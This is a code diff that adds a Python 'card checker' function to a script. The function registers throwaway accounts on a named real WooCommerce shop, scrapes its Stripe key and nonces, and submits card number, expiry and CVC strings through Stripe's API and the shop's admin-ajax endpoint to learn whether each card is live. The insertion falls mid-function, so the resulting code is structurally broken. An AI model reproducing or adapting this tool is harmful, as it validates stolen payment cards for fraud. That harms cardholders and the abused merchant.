@@ -540,35 +540,122 @@ def stripe_checker(ccx):
     except Exception as e:
         return f"STRIPE_CONN_ERROR: {str(e)[:50]}"
     ajax_headers = {
-        'authority': 'www.tacugama.com',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
-        'x-requested-with': 'XMLHttpRequest',
-    }
-    ajax_data = {
-        'action': 'wc_stripe_create_and_confirm_setup_intent',
-        'wc-stripe-payment-method': payment_id,
-        'wc-stripe-payment-type': 'card',
-        '_ajax_nonce': addnonce,
-    }
+import requests
+import re
+import uuid
+import random
+import time
+import json
+from user_agent import generate_user_agent
+
+def lolaandveranda_com(ccx):
+    ccx = ccx.strip()
+    n = ccx.split("|")[0]
+    mm = ccx.split("|")[1]
+    yy = ccx.split("|")[2]
+    cvc = ccx.split("|")[3].strip()
+    if "20" in yy:
+        yy = yy.split("20")[1]
+
+    link = "https://lolaandveranda.com"
+    user = generate_user_agent()
+    r = requests.Session()
+    headers = {'user-agent': user}
+    
+    # التسجيل في الموقع
+    res = r.get(url=f"{link}/my-account/", headers=headers).text
+    reg2 = re.search('name="woocommerce-register-nonce" value="(.*?)"', res)
+    if reg2:
+        reg = reg2.group(1)
+    else:
+        return 'Page not found ⚠️'
+    
+    username = f'u_{uuid.uuid4().hex[:8]}'
+    email = f'u_{uuid.uuid4().hex[:8]}@gmail.com'
+    password = f'P_{uuid.uuid4().hex[:8]}!'
+    data = {'username': username, 'email': email, 'password': password, 'woocommerce-register-nonce': reg, 'register': 'Register'}
+    r.post(url=f"{link}/my-account/", headers=headers, data=data)
+    
+    # جلب صفحة إضافة البطاقة
+    res3 = r.get(url=f"{link}/my-account/add-payment-method/", headers=headers)
+    
+    pk_live2 = re.search(r'(pk_(live|test)_[A-Za-z0-9_-]+)', res3.text)
+    if pk_live2:
+        pk_live = pk_live2.group(1)
+    else:
+        return 'Registration failed or page not found ⚠️'
+
+    acct2 = re.search(r'(acct_[A-Za-z0-9_-]+)', res3.text)
+    if acct2:
+        acct = f'&_stripe_account={acct2.group(1)}'
+    else:
+        acct = ''                
+        
+    addnonce2 = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', res3.text)
+    addnonce3 = re.search(r'"createSetupIntentNonce":"(.*?)"', res3.text)
+    if addnonce2:
+        addnonce = addnonce2.group(1)
+    elif addnonce3:
+        addnonce = addnonce3.group(1)
+    else:
+        return 'The add key was not found ⚠️'
+        
+    headers = {'authority': 'api.stripe.com', 'accept': 'application/json', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/', 'user-agent': user}
+
+    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&payment_user_agent=stripe.js%2F6c35f76878%3B+stripe-js-v3%2F6c35f76878%3B+payment-element%3B+deferred-intent&key={pk_live}{acct}'
+    
+    res4 = r.post('https://api.stripe.com/v1/payment_methods', data=data, headers=headers).json()
+    if 'id' in res4:
+        payment_id = res4['id']
+    else:
+        return json.dumps(res4, indent=2)
+        
+    final_headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Referer': f'{link}/my-account/add-payment-method/', 'Origin': link, 'user-agent': user}
+
+    data = {'action': 'wc_stripe_create_and_confirm_setup_intent', 'wc-stripe-payment-method': payment_id, 'wc-stripe-payment-type': 'card', '_ajax_nonce': addnonce}
+
+    r5r = r.post(f'{link}/wp-admin/admin-ajax.php', data=data, headers=final_headers)
+    
+    # قراءة الرد كـ JSON أولاً
     try:
-        admin_ajax_url = f"{base_url}/wp-admin/admin-ajax.php"
-        resp = session.post(admin_ajax_url, headers=ajax_headers, data=ajax_data, timeout=15)
-        text = resp.text
-        if 'Your card was declined' in text or 'Your card could not be set up' in text:
-            return "Your card was declined"
-        elif 'success":true' in text or 'succeeded' in text:
-            return "Payment method"
+        json_response = r5r.json()
+        
+        # التحقق من وجود error في data
+        if 'data' in json_response and 'error' in json_response['data']:
+            error = json_response['data']['error']
+            if 'message' in error:
+                return error['message']
+            elif 'code' in error:
+                return f"{error['code']} - {error.get('decline_code', 'unknown')}"
+            else:
+                return json.dumps(error, indent=2)
+        
+        # التحقق من success
+        if json_response.get('success') == True:
+            return 'Approved'
+        
+        # إذا كان الرد JSON كامل
+        if json_response:
+            return json.dumps(json_response, indent=2)
         else:
-            try:
-                j = resp.json()
-                if 'data' in j and 'error' in j['data']:
-                    msg = j['data']['error'].get('message', 'UNKNOWN')
-                    return msg
-            except:
-                pass
-            return text[:100] if text else "UNKNOWN_RESPONSE"
-    except Exception as e:
-        return f"AJAX_ERROR: {str(e)[:50]}"
+            return 'Empty JSON response'
+            
+    except:
+        # إذا لم يكن JSON، نقرأ كنص عادي
+        r5 = r5r.text
+        
+        if 'Your card was declined.' in r5:
+            return 'Your card was declined.'
+        elif 'success' in r5.lower():
+            return 'Approved'
+        elif 'Your card number is incorrect.' in r5:
+            return 'Your card number is incorrect.'
+        elif r5 == '0':
+            return 'Gateway responded with 0 - Check if card was added'
+        else:
+            return r5[:200]
+
+
 
 def reg(cc):
     try:
